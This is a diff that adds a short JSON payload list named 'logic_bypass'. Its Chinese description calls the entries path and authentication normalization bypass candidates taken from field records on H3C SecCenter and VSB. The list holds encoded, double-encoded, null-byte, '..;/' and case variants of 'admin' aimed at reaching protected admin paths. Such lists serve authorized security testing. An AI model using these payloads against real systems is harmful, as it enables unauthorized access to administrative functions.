@@ -1,0 +1,23 @@
+{
+  "name": "logic_bypass",
+  "说明": "路径/鉴权归一化绕过候选（来自 H3C SecCenter 与 VSB 实战记录）；只替换路径段，不批量枚举。",
+  "sets": {
+    "values": [
+      "%61dmin",
+      "%2561dmin",
+      "admin/",
+      "admin/.",
+      "admin/..;/",
+      "admin//",
+      "admin%2f",
+      "admin%00",
+      "ADMIN",
+      "Admin",
+      "admin;/",
+      "admin/..;/admin",
+      "admin%2e",
+      "admin%252e"
+    ]
+  },
+  "pairs": {}
+}
